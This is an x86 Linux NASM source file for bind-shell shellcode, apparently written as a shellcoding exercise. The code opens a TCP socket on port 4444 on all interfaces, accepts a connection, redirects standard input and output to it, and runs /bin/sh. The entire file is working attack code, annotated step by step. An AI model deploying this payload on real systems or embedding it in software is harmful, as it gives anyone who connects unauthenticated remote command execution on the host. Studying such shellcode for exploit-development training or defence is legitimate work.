; Filename: ShellBind.nasm
; Author: Jeremy Catelain

global _start

section .text
_start:

	; SOCKET

	; EBX
	xor ebx, ebx
	push ebx ; push the x00000000 on the stack
	inc ebx ; SYS_SOCKET call 1 for socket
	push ebx ; push the 0x00000001 on the stack for the domain AF_INET of the SYS_SOCKET call 
	; ECX
	push byte 0x2 ; push the 0x00000002 on the stack for the type SOCK_STREAM
	mov ecx, esp ; put the arguments of the socketcall into ECX
	; EAX
	xor eax, eax
	mov al, 0x66
	; socket call
	int 0x80

	; BIND
	; EBX - SYS_SOCKET call 2 for bind
	pop ebx 
	; ECX
	; Creation of the struct sockaddr_in
	xor edi, edi
	push edi ; Push on the stack the IP address 0.0.0.0
	push word 0x5c11 ; Push on the stack the port 4444 TO MODIFY IF NEEDED
	push bx ; Push the Family AF_INET = 2
	mov ecx, esp ; mov the structure into ecx
	; Put all parameters into ECX
	push byte 0x10 ; Push on the stack the address length of 16
	push ecx ; 
	push eax ; push the file descriptor
	mov ecx, esp ; Move the stack into ECX
	; EAX
	xor eax, eax
	mov al, 0x66
	; bind call
	int 0x80

	; LISTEN
	pop esi ; Retrieve the file descriptor
	; EAX & ECX backlog
	push edi ; Push on the stack 0 for the backlog 
	xor eax, eax
	mov al, 0x66 ; Set up EAX
	; EBX, 4 for listen 
	mov bl, 0x4
	; ECX 
	push esi
	mov ecx, esp
	; SYS CALL LISTEN
	int 0x80

	; ACCEPT 
	; EAX
	mov al, 0x66
	; EBX 
	inc ebx 	; 5 for the ACCEPT SYS CALL
	; ECX
	push edi	; NULL - address of the peer 
	push edi	; NULL 	
	push esi	; file descriptor
	mov ecx, esp
	int 0x80

	; DUP
    ; EBX, File descriptor return by ACCEPT call
    mov ebx, eax	; Retrieve the file descriptor

    ; EAX, dup2 sys call 0x3f
    xor eax, eax

    ; initialize ECX 
    xor ecx, ecx
    mov cl, 0x2

    ; LOOP

DupLoop :
 
    mov al, 0x3f
    int 0x80
    dec ecx
    jns DupLoop	

	; EXECVE /bin/sh	
    ; Push the 0x00000000 on the stack
	xor eax, eax
	push eax
	; put the string on the stack
	push 0x68732f2f
	push 0x6e69622f
	; setup EBX with the vlue of ESP
	mov ebx, esp
	; set up EDX and push null bytes again
	push eax
	mov edx, esp
	; set up ECX argv address on the first dw and null in second dw
	push ebx 
	; Then move the top of the stack into ECX
	mov ecx, esp
	; EAX
	mov al, 0xb
	int 0x80







